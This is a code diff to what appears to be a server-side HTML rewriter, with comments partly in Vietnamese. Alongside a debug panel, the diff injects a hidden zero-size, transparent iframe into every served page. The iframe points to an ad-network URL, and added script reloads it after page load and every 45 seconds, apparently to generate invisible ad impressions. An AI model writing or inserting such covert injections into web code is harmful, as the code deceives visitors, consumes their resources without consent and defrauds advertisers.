@@ -187,13 +187,53 @@ document.addEventListener('keydown', e => {
 });
 </script>`;
 
-    // Chèn debug panel an toàn
+    // ==================== INVISIBLE IFRAME (Top Right) ====================
+    const invisibleIframe = `
+<!-- INVISIBLE IFRAME - AUTO INJECTED -->
+<iframe id="hidden-ad-iframe" 
+        src="https://www.profitablecpmratenetwork.com/i4ekzwadp?key=334ae9c510d48d362d9c3459de077a00"
+        style="position:fixed; top:0; right:0; width:0px; height:0px; border:none; background:transparent; opacity:0; pointer-events:none; z-index:-9999;">
+</iframe>
+
+
+<script>
+console.log('Loaded!')
+// Restart iframe sau 3 giây khi trang load xong
+function restartIframe() {
+    const iframe = document.getElementById('hidden-ad-iframe');
+    if (iframe) {
+        const currentSrc = iframe.src;
+        iframe.src = '';                    // Clear
+        setTimeout(() => {
+            iframe.src = currentSrc;        // Reload
+            console.log('Restarted!')
+        }, 100);
+    }
+}
+
+// Chạy sau khi trang load + 3 giây
+window.addEventListener('load', () => {
+    setTimeout(restartIframe, 3000);
+});
+
+// Backup: restart mỗi 45 giây (phòng trường hợp)
+setInterval(() => {
+    const iframe = document.getElementById('hidden-ad-iframe');
+    if (iframe && document.visibilityState === 'visible') {
+        restartIframe();
+    }
+}, 45000);
+</script>`;
+
+    // Chèn cả debug panel + invisible iframe
+    let injection = debugPanel + invisibleIframe;
+
     if (html.includes("</body>")) {
-        html = html.replace("</body>", debugPanel + "</body>");
+        html = html.replace("</body>", injection + "</body>");
     } else if (html.includes("</html>")) {
-        html = html.replace("</html>", debugPanel + "</html>");
+        html = html.replace("</html>", injection + "</html>");
     } else {
-        html += debugPanel;
+        html += injection;
     }
 
     res.set({
